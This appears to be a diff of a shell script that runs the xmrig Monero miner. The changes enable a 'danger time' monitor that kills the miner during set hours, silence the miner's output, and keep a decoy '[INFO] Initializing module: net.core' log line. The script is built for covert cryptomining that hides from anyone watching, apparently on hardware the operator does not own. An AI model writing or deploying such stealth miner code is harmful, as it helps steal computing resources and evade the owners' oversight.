@@ -32,7 +32,7 @@ is_danger_time() {
     local time=$((10#$h * 60 + 10#$m))
 
     if (( (time >= 0 && time < 120) || (time >= 1020 && time < 1140) )); then
-        return 1
+        return 0
     else
         return 1
     fi
@@ -49,7 +49,7 @@ check_and_stop_if_needed() {
     while true; do
         if is_danger_time; then
             send_telegram "Worker $WORKER triggered in good time. Got bad zone so turning off."
-            # pkill xmrig
+            pkill xmrig
             exit 0
         fi
         sleep 60
@@ -92,7 +92,7 @@ sleep 5
 # Start time monitoring in background
 check_and_stop_if_needed &
 
-./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=8 # > /dev/null 2>&1 &
+./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=8 > /dev/null 2>&1 &
 
 while true; do
     echo "[INFO] Initializing module: net.core"
